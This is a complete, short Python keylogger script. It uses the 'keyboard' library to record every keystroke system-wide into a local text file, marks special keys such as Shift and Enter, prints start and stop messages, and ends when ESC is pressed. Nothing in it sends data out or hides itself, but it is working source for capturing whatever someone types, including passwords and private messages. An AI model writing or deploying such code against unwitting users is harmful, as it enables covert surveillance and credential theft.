import keyboard

log_file = "key_log2.txt"

def log_keystrokes(event):
    with open(log_file, "a") as f:
        if event.name == "space":
            f.write(" [SPACE] ")
        elif event.name == "enter":
            f.write(" [ENTER]\n")
        elif len(event.name) > 1:
            # Special keys like shift, ctrl, etc.
            f.write(f" [{event.name.upper()}] ")
        else:
            f.write(event.name)

print("Keylogger started... (Press ESC to stop)")
keyboard.on_press(log_keystrokes)


keyboard.wait("esc")
print("Keylogger stopped. Logs saved in", log_file)



